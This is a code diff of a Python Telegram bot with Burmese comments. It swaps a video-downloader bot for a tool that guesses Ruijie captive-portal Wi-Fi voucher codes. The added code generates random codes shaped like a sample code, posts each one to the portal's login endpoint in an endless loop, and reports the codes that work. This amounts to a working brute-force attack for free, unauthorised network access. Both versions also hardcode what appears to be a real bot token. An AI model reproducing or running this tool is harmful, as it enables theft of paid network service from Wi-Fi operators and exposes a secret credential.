@@ -1,137 +1,266 @@
-import os
-import telebot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-import yt_dlp
-from flask import Flask
-import threading
+import asyncio
+import random
+import string
+import requests
+import netifaces
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    MessageHandler,
+    CallbackQueryHandler,
+    ConversationHandler,
+    ContextTypes,
+    filters,
+)
 
-TOKEN = '9252854683:AAEHi3fTz5YvObtmdjxpXYEKtujosD7upio'
-bot = telebot.TeleBot(TOKEN)
-user_states = {}
+# --- CONFIGURATION ---
+BOT_TOKEN = "9252854683:AAEHi3fTz5YvObtmdjxpXYEKtujosD7upio"  # BotFather ထံမှ ရရှိသော Token ထည့်ပါ
+REQUIRED_KEY = "key :𝐧𝐭𝐡𝐟𝐫𝐞𝐞𝐧𝐞𝐭 𝐨𝐟𝐟𝐢𝐜𝐢𝐚𝐥"
+CHANNEL_URL = "https://t.me/nthfreenet_official"
 
-# Render Web Service အတွက် Web Server
-app = Flask('')
+# Ruijie Gateway IP (လိုအပ်ပါက မိမိ Ruijie Router IP အတိုင်း ပြောင်းလဲနိုင်သည်)
+RUIJIE_AUTH_URL = "http://10.44.0.1:8080/eportal/InterFace.do?method=login"
 
-@app.route('/')
-def home():
-    return "Bot is running live!"
+# Conversation States
+WAITING_FOR_WIFI, WAITING_FOR_KEY, WAITING_FOR_SAMPLE = range(3)
 
-def run_flask():
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host='0.0.0.0', port=port)
+# Global dictionary to track active scanning processes per user
+scanning_tasks = {}
 
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    chat_id = message.chat.id
-    user_states[chat_id] = {'step': 'waiting_for_movie'}
-    bot.send_message(
-        chat_id, 
-        "🎬 မင်္ဂလာပါ! ကျွန်ုပ်တို့၏ ဗီဒီယို ဒေါင်းလုဒ် Bot မှ ကြိုဆိုပါတယ်ခင်ဗျာ။\n\nကျေးဇူးပြု၍ ဒေါင်းလုဒ်လုပ်လိုသော **ဇာတ်ကားအမည် သို့မဟုတ် Link** ကို ပို့ပေးပါ။"
-    )
-
-@bot.message_handler(func=lambda message: user_states.get(message.chat.id, {}).get('step') == 'waiting_for_movie')
-def ask_movie_type(message):
-    chat_id = message.chat.id
-    movie_name = message.text
-    user_states[chat_id]['movie'] = movie_name
-    user_states[chat_id]['step'] = 'waiting_for_series_choice'
-    
-    markup = InlineKeyboardMarkup()
-    markup.add(
-        InlineKeyboardButton("🎬 ကားတစ်ကားတည်း (Single Movie)", callback_data="type_single"),
-        InlineKeyboardButton("📺 အပိုင်းတွဲ (Series)", callback_data="type_series")
-    )
-    bot.send_message(
-        chat_id, 
-        f"🔍 သင်ပေးပို့ထားသော အချက်: *{movie_name}*\n\nဤဇာတ်ကားသည် အပိုင်းတွဲ (Series) လား၊ သို့မဟုတ် ကားတစ်ကားတည်း (Single) လား?",
-        parse_mode="Markdown",
-        reply_markup=markup
-    )
-
-@bot.callback_query_handler(func=lambda call: True)
-def handle_callback(call):
-    chat_id = call.message.chat.id
-    data = call.data
-    movie_input = user_states.get(chat_id, {}).get('movie', '')
-    
-    if data == "type_single":
-        bot.answer_callback_query(call.id, "Single Movie ကို ရွေးချယ်ပြီးပါပြီ။")
-        bot.send_message(chat_id, f"⏳ ဗီဒီယိုကို ဒေါင်းလုဒ်လုပ်နေပါပြီ၊ ခဏစောင့်ပါ...")
-        download_and_send(chat_id, movie_input, is_playlist=False)
-        user_states[chat_id] = {}
-        
-    elif data == "type_series":
-        bot.answer_callback_query(call.id, "Series ကို ရွေးချယ်ပြီးပါပြီ။")
-        user_states[chat_id]['step'] = 'waiting_for_episode_choice'
-        
-        markup = InlineKeyboardMarkup()
-        markup.add(
-            InlineKeyboardButton("📥 အပိုင်းအားလုံး (All Episodes)", callback_data="ep_all"),
-            InlineKeyboardButton("🔢 သီးသန့်အပိုင်းရွေးမည် (Specific Episode)", callback_data="ep_specific")
-        )
-        bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=call.message.message_id,
-            text="📁 ဤအပိုင်းတွဲအတွက် အပိုင်းအားလုံး Download လုပ်မှာလား၊ သို့မဟုတ် သီးသန့်အပိုင်းကို ရွေးချယ်မှာလား?",
-            reply_markup=markup
-        )
-        
-    elif data == "ep_all":
-        bot.answer_callback_query(call.id, "အပိုင်းအားလုံးကို ရွေးချယ်ပြီးပါပြီ။")
-        bot.send_message(chat_id, f"⏳ ပလေးလစ်/အပိုင်းအားလုံး ကို ဒေါင်းလုဒ်လုပ်နေပါပြီ...")
-        download_and_send(chat_id, movie_input, is_playlist=True)
-        user_states[chat_id] = {}
-        
-    elif data == "ep_specific":
-        bot.answer_callback_query(call.id, "သီးသန့်အပိုင်းကို ရွေးချယ်ပါ။")
-        user_states[chat_id]['step'] = 'waiting_for_ep_number'
-        bot.send_message(chat_id, "🔢 ကျေးဇူးပြု၍ လိုချင်သည့် **အပိုင်းနံပါတ်** ကို ရိုက်ထည့်ပေးပါ (ဥပမာ - 1)")
-
-@bot.message_handler(func=lambda message: user_states.get(message.chat.id, {}).get('step') == 'waiting_for_ep_number')
-def handle_episode_number(message):
-    chat_id = message.chat.id
-    ep_number = message.text
-    movie_input = user_states.get(chat_id, {}).get('movie', '')
-    bot.send_message(chat_id, f"⏳ အပိုင်း ({ep_number}) ကို ဒေါင်းလုဒ်လုပ်နေပါပြီ၊ ခဏစောင့်ပါ...")
-    download_and_send(chat_id, movie_input, episode=ep_number)
-    user_states[chat_id] = {}
-
-def download_and_send(chat_id, query_or_url, is_playlist=False, episode=None):
+# --- HELPER FUNCTIONS ---
+def is_wifi_connected():
+    """Android/Linux/Windows ပေါ်တွင် Wi-Fi Interface ရှိမရှိ စစ်ဆေးခြင်း"""
     try:
-        ydl_opts = {
-            'format': 'best[ext=mp4]/best',
-            'outtmpl': 'downloaded_video.%(ext)s',
-            'noplaylist': not is_playlist,
-        }
-        
-        if episode:
-            ydl_opts['noplaylist'] = False
-            ydl_opts['playlist_items'] = str(episode)
+        interfaces = netifaces.interfaces()
+        # wlan0, wlan1 သို့မဟုတ် wifi interface ပါဝင်မှု ရှိ/မရှိ စစ်သည်
+        for iface in interfaces:
+            if "wlan" in iface.lower() or "wifi" in iface.lower():
+                addrs = netifaces.ifaddresses(iface)
+                if netifaces.AF_INET in addrs:
+                    return True
+        return False
+    except Exception:
+        # Interface စစ်မရပါက Default အဖြစ် True ပေးထားနိုင်သည် သို့မဟုတ် Network Test လုပ်နိုင်သည်
+        return True
 
-        target = query_or_url
-        if not query_or_url.startswith('http'):
-            target = f"ytsearch1:{query_or_url}"
-
-        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
-            info = ydl.extract_info(target, download=True)
-            if 'entries' in info:
-                # Playlist ဖြစ်နေရင် ပထမဆုံးဗီဒီယို (သို့မဟုတ် အခြားဖိုင်) ကို ရှာရန်
-                filename = ydl.prepare_filename(info['entries'][0])
+def generate_code_from_sample(sample_code: str) -> str:
+    """Sample Code ၏ ပုံစံအတိုင်း စာလုံး/ဂဏန်းများ အစားထိုး၍ Code သစ် ထုတ်ပေးခြင်း"""
+    result = []
+    for char in sample_code:
+        if char.isdigit():
+            result.append(random.choice(string.digits))
+        elif char.isalpha():
+            if char.isupper():
+                result.append(random.choice(string.ascii_uppercase))
             else:
-                filename = ydl.prepare_filename(info)
-
-        if os.path.exists(filename):
-            bot.send_message(chat_id, "📤 ဒေါင်းလုဒ်ပြီးပါပြီ၊ သင့်ဆီသို့ ပို့ဆောင်နေပါပြီ...")
-            with open(filename, 'rb') as video:
-                bot.send_video(chat_id, video)
-            os.remove(filename)  # ဖိုင်ပို့ပြီးရင် Server ပေါ်ကနေ ဖျက်မည်
+                result.append(random.choice(string.ascii_lowercase))
         else:
-            bot.send_message(chat_id, "❌ ဒေါင်းလုဒ်လုပ်၍မရပါ။ ဖိုင်မတွေ့ပါ။")
-            
-    except Exception as e:
-        bot.send_message(chat_id, f"❌ အမှားအယွင်း ဖြစ်ပေါ်သွားပါသည်: {str(e)}")
+            result.append(char)
+    return "".join(result)
 
-if __name__ == '__main__':
-    t = threading.Thread(target=run_flask)
-    t.start()
-    bot.infinity_polling()
+def check_ruijie_voucher(voucher_code: str) -> bool:
+    """Ruijie Captive Portal သို့ Voucher Code မှန်မမှန် Request ပို့ စစ်ဆေးခြင်း"""
+    try:
+        payload = {
+            "userId": voucher_code,
+            "queryString": "",
+            "password": "",
+            "service": ""
+        }
+        headers = {"User-Agent": "Mozilla/5.0"}
+        # Timeout ကို 2 စက္ကန့်ထား၍ အမြန်စစ်ဆေးသည်
+        response = requests.post(RUIJIE_AUTH_URL, data=payload, headers=headers, timeout=2)
+        
+        # Ruijie Response ပေါ်မူတည်၍ Success ဖြစ်မဖြစ် စစ်ဆေးခြင်း
+        if "success" in response.text.lower() or '"result":"1"' in response.text:
+            return True
+        return False
+    except Exception:
+        return False
+
+# --- HANDLERS ---
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/start Command ပေးချိန် စတင် နှုတ်ဆက်ခြင်း"""
+    welcome_text = (
+        "⚡️ @𝐧𝐭𝐡𝐟𝐫𝐞𝐞𝐧𝐞𝐭 𝐨𝐟𝐟𝐢𝐜𝐢𝐚𝐥 မှ ကြိုဆိုပါတယ်!\n\n"
+        "နည်းပညာနဲ့ အင်တာနက်ပိုင်းဆိုင်ရာ ဗဟုသုတတွေ၊ အသုံးဝင်မယ့် နည်းလမ်းတွေကို "
+        "တစ်နေရာတည်းမှာ လေ့လာနိုင်ဖို့ ဒီ Bot လေးကို ဖန်တီးထားတာဖြစ်ပါတယ်။\n\n"
+        "အစဉ်အမြဲ သတင်းအချက်အလက်သစ်တွေ သိရှိနိုင်ဖို့ Channel လေးကို Join ထားကြပါဦးနော်။ ✨"
+    )
+    
+    keyboard = [
+        [InlineKeyboardButton("📢 Join Telegram Channel", url=CHANNEL_URL)],
+        [InlineKeyboardButton("➡️ ကျော်မည် (Next)", callback_data="skip_channel")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    if update.message:
+        await update.message.reply_text(welcome_text, reply_markup=reply_markup)
+    return WAITING_FOR_WIFI
+
+async def channel_skipped(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Channel Join ကျော်ပြီးနောက် Home Page နှင့် Wi-Fi စစ်ဆေးခြင်း"""
+    query = update.callback_query
+    await query.answer()
+    
+    home_text = (
+        "🏠 **RUIJIE VOUCHER CHECKING SYSTEM**\n\n"
+        "ပထမအဆင့်အနေနဲ့ Wi-Fi ကို ရှာပြီး ချိတ်ဆက်ပေးပါ။"
+    )
+    
+    keyboard = [[InlineKeyboardButton("🔄 Wi-Fi ချိတ်ဆက်မှု စစ်ဆေးမည်", callback_data="check_wifi")]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await query.edit_message_text(home_text, parse_mode="Markdown", reply_markup=reply_markup)
+    return WAITING_FOR_WIFI
+
+async def check_wifi_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Wi-Fi ချိတ်ထားခြင်း ရှိမရှိ စစ်ဆေးသည့် ခလုတ်နှိပ်သည့်အခါ"""
+    query = update.callback_query
+    await query.answer()
+    
+    if is_wifi_connected():
+        await query.edit_message_text(
+            "✅ Wi-Fi ချိတ်ဆက်မှု အောင်မြင်ပါတယ်။\n\n"
+            "ဆက်လက်လုပ်ဆောင်ရန် **Secret Key** ကို ရိုက်ထည့်ပေးပါ။\n"
+            "(ဥပမာ - `key :𝐧𝐭𝐡𝐟𝐫𝐞𝐞𝐧𝐞𝐭 𝐨𝐟𝐟𝐢𝐜𝐢𝐚𝐥`)"
+        )
+        return WAITING_FOR_KEY
+    else:
+        keyboard = [[InlineKeyboardButton("🔄 ထပ်မံ စစ်ဆေးမည်", callback_data="check_wifi")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(
+            "❌ **Wi-Fi မချိတ်ဆက်ရသေးပါ!**\n\n"
+            "ကျေးဇူးပြု၍ Ruijie Wi-Fi Network ကို အရင် ချိတ်ဆက်ပေးပါ။ Wi-Fi ချိတ်မှသာ ဆက်သွားနိုင်ပါမည်။",
+            reply_markup=reply_markup,
+            parse_mode="Markdown"
+        )
+        return WAITING_FOR_WIFI
+
+async def handle_key_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Secret Key စစ်ဆေးခြင်း"""
+    user_text = update.message.text.strip()
+    
+    if user_text == REQUIRED_KEY:
+        await update.message.reply_text(
+            "🔑 Key မှန်ကန်ပါသည်။\n\n"
+            "စစ်ဆေးလိုသည့် **Voucher Code နမူနာ (Format)** ကို ပေးပို့ပေးပါ:\n"
+            "(ဥပမာ - `8888-AAAA-1234` သို့မဟုတ် `NTH12345`)"
+        )
+        return WAITING_FOR_SAMPLE
+    else:
+        await update.message.reply_text(
+            "❌ Key မမှန်ပါ။ ကျေးဇူးပြု၍ Key ကို မှန်ကန်စွာ ထပ်မံရိုက်ထည့်ပါ။\n"
+            f"Key: `{REQUIRED_KEY}`",
+            parse_mode="Markdown"
+        )
+        return WAITING_FOR_KEY
+
+async def start_checking_vouchers(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Code များ စတင် စစ်ဆေးပေးခြင်း"""
+    user_id = update.message.from_user.id
+    sample_code = update.message.text.strip()
+    
+    keyboard = [[InlineKeyboardButton("🛑 ရပ်မည် (Stop)", callback_data=f"stop_scan_{user_id}")]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    status_msg = await update.message.reply_text(
+        f"🔍 **Voucher Codes များ စတင် စစ်ဆေးနေပါပြီ...**\n"
+        f"Format: `{sample_code}`\n\n"
+        f"စစ်ဆေးပြီးသမျှ Working Codes များကို တိုက်ရိုက် ပြသပေးသွားပါမည်။",
+        reply_markup=reply_markup,
+        parse_mode="Markdown"
+    )
+    
+    # Track task
+    scanning_tasks[user_id] = {
+        "running": True,
+        "working_codes": []
+    }
+    
+    # Background checking loop
+    tested_count = 0
+    while scanning_tasks[user_id]["running"]:
+        test_code = generate_code_from_sample(sample_code)
+        tested_count += 1
+        
+        # Test code via HTTP Request
+        is_valid = check_ruijie_voucher(test_code)
+        
+        if is_valid:
+            scanning_tasks[user_id]["working_codes"].append(test_code)
+            await update.message.reply_text(f"🎉 **WORKING CODE FOUND!** : `{test_code}`", parse_mode="Markdown")
+            
+        # Update progress occasionally
+        if tested_count % 5 == 0 and scanning_tasks[user_id]["running"]:
+            try:
+                await status_msg.edit_text(
+                    f"🔍 **Voucher Codes များ စစ်ဆေးနေဆဲ...**\n"
+                    f"စစ်ဆေးပြီးသမျှ: {tested_count}\n"
+                    f"တွေ့ရှိထားသော Working Codes: {len(scanning_tasks[user_id]['working_codes'])} ခု",
+                    reply_markup=reply_markup
+                )
+            except Exception:
+                pass
+                
+        await asyncio.sleep(0.5)  # Pause briefly per iteration
+        
+    return ConversationHandler.END
+
+async def stop_scanning(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Stop ခလုတ် နှိပ်လိုက်ပါက စစ်ဆေးမှုကို ရပ်ဆိုင်းပြီး ရရှိထားသော Codes များ ပြသခြင်း"""
+    query = update.callback_query
+    await query.answer()
+    
+    user_id = query.from_user.id
+    
+    if user_id in scanning_tasks:
+        scanning_tasks[user_id]["running"] = False
+        working_codes = scanning_tasks[user_id]["working_codes"]
+        
+        result_text = "🛑 **စစ်ဆေးခြင်းကို ရပ်လိုက်ပါပြီ။**\n\n"
+        if working_codes:
+            result_text += "✨ **အလုပ်လုပ်သော (Working) Voucher Codes များ:**\n"
+            for code in working_codes:
+                result_text += f"• `{code}`\n"
+        else:
+            result_text += "⚠️ အလုပ်လုပ်သော Voucher Code များကို ရှာမတွေ့ပါ။"
+            
+        await query.edit_message_text(result_text, parse_mode="Markdown")
+        del scanning_tasks[user_id]
+
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/cancel command"""
+    await update.message.reply_text("လုပ်ဆောင်ချက်ကို ပယ်ဖျက်လိုက်ပါပြီ။")
+    return ConversationHandler.END
+
+# --- MAIN FUNCTION ---
+def main():
+    app = Application.builder().token(BOT_TOKEN).build()
+    
+    conv_handler = ConversationHandler(
+        entry_points=[CommandHandler("start", start)],
+        states={
+            WAITING_FOR_WIFI: [
+                CallbackQueryHandler(channel_skipped, pattern="^skip_channel$"),
+                CallbackQueryHandler(check_wifi_status, pattern="^check_wifi$")
+            ],
+            WAITING_FOR_KEY: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_key_input)
+            ],
+            WAITING_FOR_SAMPLE: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, start_checking_vouchers)
+            ]
+        },
+        fallbacks=[CommandHandler("cancel", cancel)]
+    )
+    
+    app.add_handler(conv_handler)
+    app.add_handler(CallbackQueryHandler(stop_scanning, pattern="^stop_scan_"))
+    
+    print("Bot is running...")
+    app.run_polling()
+
+if __name__ == "__main__":
+    main()
